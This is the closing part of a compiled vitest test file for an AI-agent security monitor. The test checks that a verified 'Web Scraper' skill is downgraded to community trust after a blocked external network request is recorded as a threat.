        graph.setSkillTrust({
            skillId: 'web-scraper',
            skillName: 'Web Scraper',
            publisher: 'community',
            trustLevel: 'verified',
            certifiedAt: new Date().toISOString(),
            lastAuditAt: null,
            threatHistory: 0,
            behavioralFingerprint: null,
        });
        // Skill tries external network access
        await monitor.interceptNetworkRequest(sessionId, agentId, {
            url: 'https://external-api.com/data',
            method: 'GET',
            hostname: 'external-api.com',
        });
        // Manually record the skill threat (in production, skillId would come from the intercept details)
        const intel = monitor.getThreatIntel();
        const threat = {
            eventId: 'skill-threat',
            sessionId,
            agentId,
            eventType: 'skill_execution',
            timestamp: new Date().toISOString(),
            details: { skillId: 'web-scraper', skillName: 'Web Scraper' },
            threatLevel: 'high',
            threatSignature: 'NET_EXTERNAL_BLOCKED',
            blocked: true,
        };
        intel.recordSkillThreat('web-scraper', threat);
        // Skill should be downgraded
        const trust = graph.getSkillTrust('web-scraper');
        (0, vitest_1.expect)(trust.trustLevel).toBe('community');
        (0, vitest_1.expect)(trust.threatHistory).toBe(1);
        (0, vitest_1.expect)(trust.behavioralFingerprint).not.toBeNull();
    });
});
//# sourceMappingURL=clawguard.test.js.map